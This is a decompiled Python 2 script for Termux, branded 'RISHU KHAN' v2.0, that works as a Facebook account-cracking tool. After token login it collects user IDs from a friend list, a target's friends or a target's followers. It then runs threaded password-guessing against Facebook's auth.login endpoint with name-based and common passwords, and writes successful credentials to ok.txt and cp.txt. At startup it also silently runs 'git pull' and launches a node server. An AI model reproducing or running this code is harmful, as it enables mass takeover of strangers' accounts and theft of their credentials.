# Decompile By Mr. NIKI :)
# Tera Bap Mr. NIKI OK 3:)
# Next bar samajle na
 
try:
    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
    from multiprocessing.pool import ThreadPool
except ImportError:

    os.system("pip2 install requests")
    os.system("python2 your-name.py")
os.system("clear")

if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
    os.system("apt update && apt install nodejs -y")

from requests.exceptions import ConnectionError

os.system("git pull")
if not os.path.isfile("/data/data/com.termux/files/home/mz-pro/...../node_modules/bytes/index.js"):

    os.system("fuser -k 5000/tcp &")
    os.system("cd ..... && pip install progress")
    os.system("cd ..... && npm install")
    os.system("cd ..... && node index.js &")
    os.system("clear")
    time.sleep(10)

elif os.path.isfile("/data/data/com.termux/files/home/mz-pro/...../node_modules/bytes/index.js"):

    os.system("fuser -k 5000/tcp &")
    os.system("#")
    os.system("cd ..... && node index.js &")
    os.system("clear")

bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)

header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf-8")

c = "\033[1;92m"
c2 = "\033[0;97m" 
c3 = "\033[1;91m"

logo = """                                
\033[1;37m  ╔══════════════════════════════════════╗
\033[1;37m  ║    .d8b.  db      \033[1;31md8888b. \033[1;37mdb    db   \033[1;37m║
\033[1;37m  ║   d8' `8b 88      \033[1;31mVP  `8D \033[1;37m`8b  d8'   \033[1;37m║
\033[1;37m  ║   88ooo88 88        \033[1;31moooY'  \033[1;37m`8bd8'    \033[1;37m║
\033[1;37m  ║   88~~~88 88        \033[1;31m~~~b.  \033[1;37m.dPYb.    \033[1;37m║
\033[1;37m  ║   \033[1;32m88   88 88booo. \033[1;31mdb   8D \033[1;32m.8P  Y8.   \033[1;37m║
\033[1;37m  ║   \033[1;32mYP   YP Y88888P \033[1;31mY8888P' \033[1;32mYP    YP   \033[1;37m║
\033[1;37m  ╚══════════════════════════════════════╝
      [\033[1;97m\033[1;41m IF YOU DREAM IT CAN YOU DO IT \033[0m]
\033[1;37m  ╔══════════════════════════════════════╗
\033[1;37m  ║  ➤ \033[1;31mAUTHOR   \033[1;37m: \033[1;32mRISHU KHAN             \033[1;37m║
\033[1;37m  ║  ➤ \033[1;31mVERSION  \033[1;37m: \033[1;32m2.0                    \033[1;37m║
\033[1;37m  ║  ➤ \033[1;31mFACEBOOK \033[1;37m: \033[1;32mwww.fb.com/AL3X.KHAN.  \033[1;37m║
\033[1;37m  ╚══════════════════════════════════════╝"""
def main():
    os.system("clear")
    print logo
    print("[\033[1;97m\033[1;41m----------------LETS START----------------\033[0m]").center(50)
    print("\033[1;97m--------------------------------------------")
    print(" ➤ \033[1;97m[1] START CLONiNG....")
    print(" ➤ \033[1;97m[2] FOLLOW Me On Fn ")
    print(" ➤ \033[1;97m[0] EXIT ")
    print("\033[1;97m--------------------------------------------")
    main_select()
def main_select():
    Mz = raw_input("\033[1;97m[\033[1;92m✓\033[1;97m] Choose ➤\033[1;92m ")
    if Mz  =="1":
        login()
    if Mz =="2":
        os.system("xdg-open https://www.facebook.com/Rishu.X.420")
	main()   
    elif Mz =="0":
        os.system("exit")
    else:
        print("[!] Please select a valid option").center(50)
        time.sleep(2)
        main()
def login():
    os.system("clear")
    print logo
    print("[\033[1;97m\033[1;41m---------------Login Menu-----------------\033[0m]").center(50)
    print("\033[1;97m--------------------------------------------")
    print(" ➤ \033[1;97m[1] Login Using Token")
    print(" ➤ \033[1;97m[2] HOW TO GET FRE TOKEN.")
    print(" ➤ \033[1;97m[3] Back")
    print("\033[1;97m--------------------------------------------")
    login_select()
def login_select():

    Mz = raw_input(" \033[1;97m[\033[1;92m✓\033[1;97m] Choose ➤\033[1;92m ")
    if Mz =="1":
        os.system("clear")
        print logo
	print("[\033[1;97m\033[1;41m-------------login with token-------------\033[0m]").center(50)

        token = raw_input("\033[1;97m[\033[1;92m✓\033[1;97m] Token ➤ \033[0;92m")
        token_s = open(".fb_token.txt","w")
        token_s.write(token)
        token_s.close()
        try:
            r = requests.get("https://graph.facebook.com/me?access_token="+token)
            q = json.loads(r.text)
            name = q["name"]
            nm = name.rsplit(" ")[0]

            print("")
            print("\033[1;92mYour token login successfully").center(50)
            time.sleep(1)
	    os.system("xdg-open https://www.facebook.com/Rishu.X.420")
	    time.sleep(1)
            menu()
        except (KeyError , IOError):

            print("")
            print("\033[1;91mToken invalid or account has checkpoint\033[0;97m").center(50)
            print("")
            time.sleep(2)
            login()
            
    elif Mz =="2":
        os.system("xdg-open https://www.facebook.com/Rishu.X.420")
    elif Mz =="3":
        main()
        
    else:
        print("")
        print("Select a valid option").center(50)
        print("")
        login_select()

def menu():
    global token
    os.system("clear")

    print logo
    try:
        token = open(".fb_token.txt","r").read()
    except (KeyError , IOError):
        login()

    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token)
        q = json.loads(r.text)
        nm = q["name"]
        nmf = nm.rsplit(" ")[0]
        ok = nmf
    except (KeyError , IOError):

        print("")
        print("\033[1;91mlogin account has checkpoint").center(50)
        print("")

        os.system("rm -rf .fb_token.txt")
        time.sleep(1)
        login()

    except requests.exceptions.ConnectionError:
        print logo
        print("")
        print("\033[1;91mYour internet connection failed").center(50)
        print("")
        time.sleep(2)
        menu()

    os.system("clear")
    print logo
    print("    \t\033[1;97m[\033[1;92m✓\033[1;97m] \033[1;92mNAME ➤ \033[1;91m" +nm)
    print("\033[1;97m--------------------------------------------")
    print("\033[1;97m ➤ \033[1;97m[1] Crack From Friendlist")
    print("\033[1;97m ➤ \033[1;97m[2] Crack From Public id")
    print("\033[1;97m ➤ \033[1;97m[3] Crack From Followers id")
    print("\033[1;97m ➤ \033[1;97m[0] EXIT ")
    print("\033[1;97m--------------------------------------------")
    menu_select()
def menu_select():
	
	select = raw_input("\033[1;97m[\033[1;92m✓\033[1;97m] Choose ➤\033[1;92m ")

	id=[]
	oks=[]
	cps=[]

	if select=="1":
		os.system("clear")

		print logo
		print("")
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for s in z["data"]:
			uid=s['id']
			na=s['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'='+nm)
	if select =="2":
		os.system("clear")

		print(logo)
		print("")
		idt = raw_input("\033[1;97m[\033[1;92m✓\033[1;97m] Public ID ➤\033[1;92m ")
		os.system("clear")
		print logo
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			print("\033[1;97m[\033[1;92m✓\033[1;97m] \033[1;92mTARGET NAME ➤ \033[1;91m"+q["name"])

		except (KeyError , IOError):

		    print("")
		    print("\033[1;91your login account has checkpoint").center(50)
		    print("")
		    menu()

		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:

			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'='+nm)

	elif select =="3":
		os.system("clear")

		print logo
                print("[\033[1;97m\033[1;41m----------Gave Public Id Link---------\033[0m]")
		idt = raw_input("\033[1;97m[\033[1;92m✓\033[1;97m] Public ID \033[1;97m➤\033[1;92m ")
		os.system("clear")
		print logo

		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print(" \033[1;97m[\033[1;92m✓\033[1;97m] \033[1;92mTarget Name \033[1;97m➤ \033[1;91m"+q["name"])

		except (KeyError , IOError):

		    print("")
		    print("\033[1;91m login id has checkpoint").center(50)
		    print("")
		    time.sleep(3)
		    menu()

		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'='+nm)

	elif select =="0":
	    os.system("exit")

	else:
	    print("\033[1;91mPlease Select A Valid Option").center(50)
	    time.sleep(2)
	    menu_select()

	print("\033[1;97m[\033[1;92m✓\033[1;97m] \033[1;92mTotal IDs \033[1;97m➤ \033[1;91m"+str(len(id)))
	time.sleep(0.5)
	print("\033[1;97m[\033[1;97m\033[1;41m-----------Please Wait A minute-----------\033[0m]")
	print 47*("-")

	def main(arg):
		user=arg
		uid,name=user.split("=")
		try:

		    pass1=name+"@123"
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		    d=json.loads(q)
		    if 'www.facebook.com' in d['error_msg']:
		        print("\x1b[1;97m[\x1b[1;97mRISHU-CP\x1b[1;97m]\x1b[1;91m "+uid+"\x1b[1;97m | \x1b[1;91m"+pass1+"\x1b[1;97m | \x1b[1;92m"+name)
		        cp=open("cp.txt","a")
		        cp.write(uid+" | "+pass1+"\n")
		        cp.close()
		        cps.append(uid)
		    else:
		    	if "access_token" in d:
		            print("\t\x1b[1;92m[RISHU-OK] "+uid+" | "+pass1+" | "+name)
		            ok=open("ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		        else:
		            pass2=name+"123"
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("\x1b[1;97m[\x1b[1;97mRISHU-CP\x1b[1;97m]\x1b[1;91m "+uid+"\x1b[1;97m | \x1b[1;91m"+pass1+"\x1b[1;97m | \x1b[1;92m"+name)
		                cp=open("cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		            else:
		                if 'access_token' in d:
		                    print("\t\x1b[1;92m[RISHU-OK] "+uid+" | "+pass2+" | "+name)
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                else:
		                    pass3=name+"1122"
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("\x1b[1;97m[\x1b[1;97mRISHU-CP\x1b[1;97m]\x1b[1;91m "+uid+"\x1b[1;97m | \x1b[1;91m"+pass1+"\x1b[1;97m | \x1b[1;92m"+name)
		                        cp=open("cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                    else:
		                        if 'access_token' in d:
		                            print("\t\x1b[1;92m[RISHU-OK] "+uid+" | "+pass3+" | "+name)
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                        else:
		                            pass4=name+"1234"
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("\x1b[1;97m[\x1b[1;97mRISHU-CP\x1b[1;97m]\x1b[1;91m "+uid+"\x1b[1;97m | \x1b[1;91m"+pass1+"\x1b[1;97m | \x1b[1;92m"+name)
		                                cp=open("cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                            else:
		                                if 'access_token' in d:
		                                    print("\t\x1b[1;92m[RISHU-OK] "+uid+" | "+pass4+" | "+name)
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                else:
		                                    pass5=name+"12345"
		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print("\x1b[1;97m[\x1b[1;97mRISHU-CP\x1b[1;97m]\x1b[1;91m "+uid+"\x1b[1;97m | \x1b[1;91m"+pass5+"\x1b[1;97m | \x1b[1;92m"+name)
		                                        cp=open("cp.txt","a")
		                                        cp.write(uid+" | "+pass5+"\n")
		                                        cp.close()
		                                        cps.append(uid)
		                                    else:
		                                        if 'access_token' in d:
		                                            print("\t\x1b[1;92m[RISHU-OK] "+uid+" | "+pass5+" | "+name)
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                        else:
		                                            pass6=name+"123456"
		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                            d=json.loads(q)
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                print("\x1b[1;97m[\x1b[1;97mRISHU-CP\x1b[1;97m]\x1b[1;91m "+uid+"\x1b[1;97m | \x1b[1;91m"+pass6+"\x1b[1;97m | \x1b[1;92m"+name)
		                                                cp=open("cp.txt","a")
		                                                cp.write(uid+" | "+pass6+"\n")
		                                                cp.close()
		                                                cps.append(uid)
		                                            else:
		                                                if 'access_token' in d:
		                                                    print("\t\x1b[1;92m[RISHU-OK] "+uid+" | "+pass6+" | "+name)
		                                                    ok=open("ok.txt","a")
		                                                    ok.write(uid+" | "+pass6+"\n")
		                                                    ok.close()
		                                                    oks.append(uid)
		                                                else:
		                                                    pass7=name+"12"
		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                                    d=json.loads(q)
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        print("\x1b[1;97m[\x1b[1;97mRISHU-CP\x1b[1;97m]\x1b[1;91m "+uid+"\x1b[1;97m | \x1b[1;91m"+pass7+"\x1b[1;97m | \x1b[1;92m"+name)
		                                                        cp=open("cp.txt","a")
		                                                        cp.write(uid+" | "+pass7+"\n")
		                                                        cp.close()
		                                                        cps.append(uid)
		                                                    else:
		                                                        if 'access_token' in d:
		                                                            print("\t\x1b[1;92m[RISHU-OK] "+uid+" | "+pass7+" | "+name)
		                                                            ok=open("ok.txt","a")
		                                                            ok.write(uid+" | "+pass7+"\n")
		                                                            ok.close()
		                                                            oks.append(uid)
		                                                        else:
		                                                            pass8="123456"
		                                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass8 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                                            d=json.loads(q)
		                                                            if 'www.facebook.com' in d['error_msg']:
		                                                                print("\x1b[1;97m[\x1b[1;97mRISHU-CP\x1b[1;97m]\x1b[1;91m "+uid+"\x1b[1;97m | \x1b[1;91m"+pass8+"\x1b[1;97m | \x1b[1;92m"+name)
		                                                                cp=open("cp.txt","a")
		                                                                cp.write(uid+" | "+pass8+"\n")
		                                                                cp.close()
		                                                                cps.append(uid)
		                                                            else:
		                                                                if 'access_token' in d:
		                                                                    print("\t\x1b[1;92m[RISHU-OK] "+uid+" | "+pass8+" | "+name)
		                                                                    ok=open("ok.txt","a")
		                                                                    ok.write(uid+" | "+pass8+"\n")
		                                                                    ok.close()
		                                                                    oks.append(uid)
		                                                                else:
		                                                                    pass9=name+"786"
		                                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass9 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                                                    d=json.loads(q)
		                                                                    if 'www.facebook.com' in d['error_msg']:
		                                                                        print("\x1b[1;97m[\x1b[1;97mRISHU-CP\x1b[1;97m]\x1b[1;91m "+uid+"\x1b[1;97m | \x1b[1;91m"+pass9+"\x1b[1;97m | \x1b[1;92m"+name)
		                                                                        cp=open("cp.txt","a")
		                                                                        cp.write(uid+" | "+pass9+"\n")
		                                                                        cp.close()
		                                                                        cps.append(uid)
		                                                                    else:
		                                                                        if 'access_token' in d:
		                                                                            print("\t\x1b[1;92m[RISHU-OK] "+uid+" | "+pass9+" | "+name)
		                                                                            ok=open("ok.txt","a")
		                                                                            ok.write(uid+" | "+pass9+"\n")
		                                                                            ok.close()
		                                                                            oks.append(uid)
		                                                                        else:
		                                                                            pass10="786786"
		                                                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass10 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                                                            d=json.loads(q)
		                                                                            if 'www.facebook.com' in d['error_msg']:
		                                                                                print("\x1b[1;97m[\x1b[1;97mRISHU-CP\x1b[1;97m]\x1b[1;91m "+uid+"\x1b[1;97m | \x1b[1;91m"+pass10+"\x1b[1;97m | \x1b[1;92m"+name)
		                                                                                cp=open("cp.txt","a")
		                                                                                cp.write(uid+" | "+pass10+"\n")
		                                                                                cp.close()
		                                                                                cps.append(uid)
		                                                                            else:
		                                                                                if 'access_token' in d:
		                                                                                    print("\t\x1b[1;92m[RISHU-OK] "+uid+" | "+pass10+" | "+name)
		                                                                                    ok=open("ok.txt","a")
		                                                                                    ok.write(uid+" | "+pass10+"\n")
		                                                                                    ok.close()
		                                                                                    oks.append(uid)
		                                                                                else:
		                                                                                    pass11="111222"
		                                                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass11 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                                                                    d=json.loads(q)
		                                                                                    if 'www.facebook.com' in d['error_msg']:
		                                                                                        print("\x1b[1;97m[\x1b[1;97mRISHU-CP\x1b[1;97m]\x1b[1;91m "+uid+"\x1b[1;97m | \x1b[1;91m"+pass11+"\x1b[1;97m | \x1b[1;92m"+name)
		                                                                                        cp=open("cp.txt","a")
		                                                                                        cp.write(uid+" | "+pass11+"\n")
		                                                                                        cp.close()
		                                                                                        cps.append(uid)
		                                                                                    else:
		                                                                                        if 'access_token' in d:
		                                                                                            print("\t\x1b[1;92m[RISHU-OK] "+uid+" | "+pass11+" | "+name)
		                                                                                            ok=open("ok.txt","a")
		                                                                                            ok.write(uid+" | "+pass11+"\n")
		                                                                                            ok.close()
		                                                                                            oks.append(uid)

		except:
			pass

        p = ThreadPool(30)
	p.map(main, id)
	print("\033[1;37m--------------------------------------------")
	print (' ➤ \033[1;92mProcess Has Been Completed')
	print (' ➤ Total CP/OK: '+str(len(cps))+'/\033[;32m \033[0;97m'+str(len(oks)))
	print("\033[1;37m--------------------------------------------")	
        raw_input("\t\x1b[0;93mPress enter to main menu back")
	menu()

if __name__ == '__main__':
    main()

